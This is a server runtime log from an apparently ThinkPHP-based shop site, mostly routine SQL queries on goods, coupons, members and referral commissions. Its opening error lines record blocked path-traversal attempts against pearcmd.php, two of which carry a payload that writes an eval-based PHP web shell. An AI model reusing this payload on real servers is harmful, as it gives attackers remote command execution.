[2022-12-14T01:46:07+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-14T01:51:23+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-14T01:51:23+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-14T01:51:23+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-14T10:41:56+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-14T10:41:56+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-14T13:51:26+08:00][sql] CONNECT:[ UseTime:0.000518s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:51:26+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_coupon_type` [ RunTime:0.001558s ]
[2022-12-14T13:51:26+08:00][sql] SELECT `pct`.`coupon_type_id`,`pct`.`type`,`pct`.`site_id`,`pct`.`coupon_name`,`pct`.`money`,`pct`.`discount`,`pct`.`max_fetch`,`pct`.`at_least`,`pct`.`end_time`,`pct`.`validity_type`,`pct`.`fixed_term`,`pct`.`goods_type`,`pct`.`site_name` FROM `gxfc_promotion_coupon_type` `pct` INNER JOIN `gxfc_shop` `s` ON `s`.`site_id`=`pct`.`site_id` WHERE  `pct`.`status` = 1  AND `pct`.`is_show` = 1  AND ( `pct`.`goods_ids`  like  '%,215,%' or pct.goods_type = 1 )  AND `pct`.`site_id` = '1' ORDER BY `pct`.`money` DESC [ RunTime:0.000985s ]
[2022-12-14T13:51:26+08:00][sql] CONNECT:[ UseTime:0.000503s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:51:26+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_goods_sku` [ RunTime:0.001320s ]
[2022-12-14T13:51:26+08:00][sql] SELECT `goods_id` FROM `gxfc_goods_sku` WHERE  `sku_id` = 1123 LIMIT 1 [ RunTime:0.000422s ]
[2022-12-14T13:51:26+08:00][sql] SELECT `sku_id`,`site_id`,`goods_id`,`sku_name`,`sku_no`,`sku_spec_format`,`price`,`market_price`,`cost_price`,`discount_price`,`promotion_type`,`start_time`,`end_time`,`stock`,`weight`,`volume`,`click_num`,`sale_num`,`collect_num`,`sku_image`,`sku_images`,`goods_class`,`goods_class_name`,`goods_attr_class`,`goods_attr_name`,`goods_name`,`site_name`,`website_id`,`brand_id`,`brand_name`,`goods_content`,`is_own`,`goods_state`,`verify_state`,`verify_state_remark`,`goods_stock_alarm`,`is_virtual`,`virtual_indate`,`is_free_shipping`,`shipping_template`,`goods_spec_format`,`goods_attr_format`,`is_delete`,`introduction`,`keywords`,`unit`,`sort`,`create_time`,`modify_time`,`video_url`,`goods_shop_category_ids`,`evaluate`,`evaluate_shaitu`,`evaluate_shipin`,`evaluate_zhuiping`,`evaluate_haoping`,`evaluate_zhongping`,`evaluate_chaping`,`spec_name`,`supplier_id`,`max_buy`,`min_buy`,`supply_goods_id`,`supply_sku_id`,`fenxiao_price`,`stock_alarm`,`sale_sort`,`is_default`,`discount_config`,`discount_method`,`recommend_way`,`cash_pledge`,`is_lease` FROM `gxfc_goods_sku` WHERE  `goods_id` = 215 [ RunTime:0.000899s ]
[2022-12-14T13:51:26+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_bundling_goods` [ RunTime:0.000838s ]
[2022-12-14T13:51:26+08:00][sql] SELECT `bl_id` FROM `gxfc_promotion_bundling_goods` WHERE  `sku_id` = 1123 [ RunTime:0.000311s ]
[2022-12-14T13:51:26+08:00][sql] CONNECT:[ UseTime:0.003134s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:51:26+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_goods` [ RunTime:0.001110s ]
[2022-12-14T13:51:26+08:00][sql] SELECT `goods_id`,`goods_name`,`goods_class`,`goods_class_name`,`goods_attr_class`,`goods_attr_name`,`site_id`,`site_name`,`goods_image`,`website_id`,`brand_id`,`brand_name`,`goods_content`,`is_own`,`goods_state`,`category_id`,`category_json`,`verify_state`,`verify_state_remark`,`price`,`market_price`,`cost_price`,`goods_stock`,`goods_stock_alarm`,`is_virtual`,`virtual_indate`,`is_free_shipping`,`shipping_template`,`goods_spec_format`,`goods_attr_format`,`is_delete`,`introduction`,`keywords`,`unit`,`sort`,`create_time`,`modify_time`,`video_url`,`commission_rate`,`sale_num`,`goods_shop_category_ids`,`evaluate`,`evaluate_shaitu`,`evaluate_shipin`,`evaluate_zhuiping`,`evaluate_haoping`,`evaluate_zhongping`,`evaluate_chaping`,`is_fenxiao`,`fenxiao_type`,`supplier_id`,`max_buy`,`min_buy`,`timer_on`,`timer_off`,`supply_goods_id`,`discount_config`,`discount_method`,`sku_id`,`promotion_addon`,`category_name`,`recommend_way`,`wj_off`,`is_sale`,`is_lease`,`cash_pledge` FROM `gxfc_goods` WHERE  `goods_id` = 215 LIMIT 1 [ RunTime:0.000723s ]
[2022-12-14T13:51:26+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_manjian` [ RunTime:0.000835s ]
[2022-12-14T13:51:26+08:00][sql] SELECT `manjian_id`,`site_id`,`manjian_name`,`manjian_type`,`goods_ids`,`status`,`start_time`,`end_time`,`rule_json` FROM `gxfc_promotion_manjian` WHERE  `status` = 1  AND (`goods_ids` LIKE '215' OR `goods_ids` LIKE '%215,%' OR `goods_ids` LIKE '%215' OR `goods_ids` LIKE '%,215,%' OR `goods_ids` LIKE '')  AND `end_time` > 1670997086  AND `site_id` = 1 ORDER BY `create_time` DESC LIMIT 1 [ RunTime:0.000516s ]
[2022-12-14T13:51:31+08:00][sql] CONNECT:[ UseTime:0.038022s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:51:31+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_coupon_type` [ RunTime:0.002394s ]
[2022-12-14T13:51:31+08:00][sql] CONNECT:[ UseTime:0.004763s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:51:31+08:00][sql] SELECT `pct`.`coupon_type_id`,`pct`.`type`,`pct`.`site_id`,`pct`.`coupon_name`,`pct`.`money`,`pct`.`discount`,`pct`.`max_fetch`,`pct`.`at_least`,`pct`.`end_time`,`pct`.`validity_type`,`pct`.`fixed_term`,`pct`.`goods_type`,`pct`.`site_name` FROM `gxfc_promotion_coupon_type` `pct` INNER JOIN `gxfc_shop` `s` ON `s`.`site_id`=`pct`.`site_id` WHERE  `pct`.`status` = 1  AND `pct`.`is_show` = 1  AND ( `pct`.`goods_ids`  like  '%,214,%' or pct.goods_type = 1 )  AND `pct`.`site_id` = '1' ORDER BY `pct`.`money` DESC [ RunTime:0.001611s ]
[2022-12-14T13:51:31+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_goods` [ RunTime:0.001583s ]
[2022-12-14T13:51:31+08:00][sql] SELECT `goods_id`,`goods_name`,`goods_class`,`goods_class_name`,`goods_attr_class`,`goods_attr_name`,`site_id`,`site_name`,`goods_image`,`website_id`,`brand_id`,`brand_name`,`goods_content`,`is_own`,`goods_state`,`category_id`,`category_json`,`verify_state`,`verify_state_remark`,`price`,`market_price`,`cost_price`,`goods_stock`,`goods_stock_alarm`,`is_virtual`,`virtual_indate`,`is_free_shipping`,`shipping_template`,`goods_spec_format`,`goods_attr_format`,`is_delete`,`introduction`,`keywords`,`unit`,`sort`,`create_time`,`modify_time`,`video_url`,`commission_rate`,`sale_num`,`goods_shop_category_ids`,`evaluate`,`evaluate_shaitu`,`evaluate_shipin`,`evaluate_zhuiping`,`evaluate_haoping`,`evaluate_zhongping`,`evaluate_chaping`,`is_fenxiao`,`fenxiao_type`,`supplier_id`,`max_buy`,`min_buy`,`timer_on`,`timer_off`,`supply_goods_id`,`discount_config`,`discount_method`,`sku_id`,`promotion_addon`,`category_name`,`recommend_way`,`wj_off`,`is_sale`,`is_lease`,`cash_pledge` FROM `gxfc_goods` WHERE  `goods_id` = 214 LIMIT 1 [ RunTime:0.000883s ]
[2022-12-14T13:51:31+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_manjian` [ RunTime:0.000892s ]
[2022-12-14T13:51:31+08:00][sql] SELECT `manjian_id`,`site_id`,`manjian_name`,`manjian_type`,`goods_ids`,`status`,`start_time`,`end_time`,`rule_json` FROM `gxfc_promotion_manjian` WHERE  `status` = 1  AND (`goods_ids` LIKE '214' OR `goods_ids` LIKE '%214,%' OR `goods_ids` LIKE '%214' OR `goods_ids` LIKE '%,214,%' OR `goods_ids` LIKE '')  AND `end_time` > 1670997091  AND `site_id` = 1 ORDER BY `create_time` DESC LIMIT 1 [ RunTime:0.000599s ]
[2022-12-14T13:51:31+08:00][sql] CONNECT:[ UseTime:0.000458s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:51:31+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_goods_sku` [ RunTime:0.001180s ]
[2022-12-14T13:51:31+08:00][sql] SELECT `goods_id` FROM `gxfc_goods_sku` WHERE  `sku_id` = 1122 LIMIT 1 [ RunTime:0.000613s ]
[2022-12-14T13:51:31+08:00][sql] SELECT `sku_id`,`site_id`,`goods_id`,`sku_name`,`sku_no`,`sku_spec_format`,`price`,`market_price`,`cost_price`,`discount_price`,`promotion_type`,`start_time`,`end_time`,`stock`,`weight`,`volume`,`click_num`,`sale_num`,`collect_num`,`sku_image`,`sku_images`,`goods_class`,`goods_class_name`,`goods_attr_class`,`goods_attr_name`,`goods_name`,`site_name`,`website_id`,`brand_id`,`brand_name`,`goods_content`,`is_own`,`goods_state`,`verify_state`,`verify_state_remark`,`goods_stock_alarm`,`is_virtual`,`virtual_indate`,`is_free_shipping`,`shipping_template`,`goods_spec_format`,`goods_attr_format`,`is_delete`,`introduction`,`keywords`,`unit`,`sort`,`create_time`,`modify_time`,`video_url`,`goods_shop_category_ids`,`evaluate`,`evaluate_shaitu`,`evaluate_shipin`,`evaluate_zhuiping`,`evaluate_haoping`,`evaluate_zhongping`,`evaluate_chaping`,`spec_name`,`supplier_id`,`max_buy`,`min_buy`,`supply_goods_id`,`supply_sku_id`,`fenxiao_price`,`stock_alarm`,`sale_sort`,`is_default`,`discount_config`,`discount_method`,`recommend_way`,`cash_pledge`,`is_lease` FROM `gxfc_goods_sku` WHERE  `goods_id` = 214 [ RunTime:0.001114s ]
[2022-12-14T13:51:31+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_bundling_goods` [ RunTime:0.000769s ]
[2022-12-14T13:51:31+08:00][sql] SELECT `bl_id` FROM `gxfc_promotion_bundling_goods` WHERE  `sku_id` = 1122 [ RunTime:0.000360s ]
[2022-12-14T13:52:35+08:00][sql] CONNECT:[ UseTime:0.000440s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:52:35+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_coupon_type` [ RunTime:0.001344s ]
[2022-12-14T13:52:35+08:00][sql] SELECT `pct`.`coupon_type_id`,`pct`.`type`,`pct`.`site_id`,`pct`.`coupon_name`,`pct`.`money`,`pct`.`discount`,`pct`.`max_fetch`,`pct`.`at_least`,`pct`.`end_time`,`pct`.`validity_type`,`pct`.`fixed_term`,`pct`.`goods_type`,`pct`.`site_name` FROM `gxfc_promotion_coupon_type` `pct` INNER JOIN `gxfc_shop` `s` ON `s`.`site_id`=`pct`.`site_id` WHERE  `pct`.`status` = 1  AND `pct`.`is_show` = 1 ORDER BY `pct`.`money` DESC [ RunTime:0.000656s ]
[2022-12-14T13:53:07+08:00][sql] CONNECT:[ UseTime:0.000412s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:53:07+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_exchange` [ RunTime:0.000986s ]
[2022-12-14T13:53:07+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_promotion_exchange` `peg` WHERE  `peg`.`state` = 1  AND `peg`.`type` = 1 ORDER BY `id` DESC [ RunTime:0.000362s ]
[2022-12-14T13:53:07+08:00][sql] SELECT `peg`.* FROM `gxfc_promotion_exchange` `peg` WHERE  `peg`.`state` = 1  AND `peg`.`type` = 1 ORDER BY `id` DESC LIMIT 0,10 [ RunTime:0.000394s ]
[2022-12-14T13:53:07+08:00][sql] CONNECT:[ UseTime:0.000441s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T13:53:07+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_promotion_exchange` [ RunTime:0.000750s ]
[2022-12-14T13:53:07+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_promotion_exchange` `peg` WHERE  `peg`.`state` = 1  AND `peg`.`type` = 1 ORDER BY `id` DESC [ RunTime:0.000355s ]
[2022-12-14T13:53:07+08:00][sql] SELECT `peg`.* FROM `gxfc_promotion_exchange` `peg` WHERE  `peg`.`state` = 1  AND `peg`.`type` = 1 ORDER BY `id` DESC LIMIT 0,10 [ RunTime:0.000321s ]
[2022-12-14T16:15:55+08:00][sql] CONNECT:[ UseTime:0.000459s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T16:15:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000924s ]
[2022-12-14T16:15:55+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000702s ]
[2022-12-14T16:15:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000725s ]
[2022-12-14T16:15:55+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2365  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000567s ]
[2022-12-14T16:15:55+08:00][sql] CONNECT:[ UseTime:0.000342s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T16:15:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000850s ]
[2022-12-14T16:15:55+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 33  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000306s ]
[2022-12-14T16:15:55+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000726s ]
[2022-12-14T16:15:55+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2365  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.001517s ]
[2022-12-14T16:15:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000592s ]
[2022-12-14T16:15:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000616s ]
[2022-12-14T16:15:55+08:00][sql] SELECT `fenxiao_id`,`fenxiao_no`,`fenxiao_name`,`mobile`,`member_id`,`level_id`,`level_name`,`parent`,`grand_parent`,`account`,`account_withdraw`,`account_withdraw_apply`,`status`,`create_time`,`audit_time`,`lock_time`,`one_fenxiao_order_num`,`one_fenxiao_order_money`,`one_child_num`,`one_child_fenxiao_num`,`two_child_fenxiao_num`,`total_commission`,`is_delete`,`two_rate` FROM `gxfc_fenxiao` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000404s ]
[2022-12-14T16:15:55+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000384s ]
[2022-12-14T16:15:55+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `source_member` = 2365 [ RunTime:0.000520s ]
[2022-12-14T16:15:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_account` [ RunTime:0.000688s ]
[2022-12-14T16:15:55+08:00][sql] SELECT `id`,`account_no`,`fenxiao_id`,`fenxiao_name`,`money`,`type`,`type_name`,`relate_id`,`create_time` FROM `gxfc_fenxiao_account` WHERE  `fenxiao_id` = 33 [ RunTime:0.000301s ]
[2022-12-14T16:15:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000694s ]
[2022-12-14T16:15:55+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 33  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000292s ]
[2022-12-14T16:15:55+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 33  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000251s ]
[2022-12-14T16:15:55+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 33  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000287s ]
[2022-12-14T16:15:55+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 33 OR `two_fenxiao_id` = 33 OR `three_fenxiao_id` = 33 ) LIMIT 1 [ RunTime:0.000259s ]
[2022-12-14T16:15:58+08:00][sql] CONNECT:[ UseTime:0.000430s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T16:15:58+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000840s ]
[2022-12-14T16:15:58+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000674s ]
[2022-12-14T16:15:58+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000657s ]
[2022-12-14T16:15:58+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2365  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000512s ]
[2022-12-14T16:15:58+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 33  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000294s ]
[2022-12-14T16:15:58+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2365  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000441s ]
[2022-12-14T16:15:58+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000535s ]
[2022-12-14T16:15:58+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000346s ]
[2022-12-14T16:15:58+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000662s ]
[2022-12-14T16:15:58+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 33  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000307s ]
[2022-12-14T16:15:58+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 33  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000257s ]
[2022-12-14T16:15:58+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 33  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000245s ]
[2022-12-14T16:15:58+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 33 OR `two_fenxiao_id` = 33 OR `three_fenxiao_id` = 33 ) LIMIT 1 [ RunTime:0.000262s ]
[2022-12-14T16:15:58+08:00][sql] CONNECT:[ UseTime:0.000503s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T16:15:58+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000929s ]
[2022-12-14T16:15:58+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000652s ]
[2022-12-14T16:15:58+08:00][sql] SELECT `nickname`,`headimg` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000394s ]
[2022-12-14T16:25:14+08:00][sql] CONNECT:[ UseTime:0.000421s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T16:25:14+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000871s ]
[2022-12-14T16:25:14+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2395 LIMIT 1 [ RunTime:0.000551s ]
[2022-12-14T16:25:14+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000602s ]
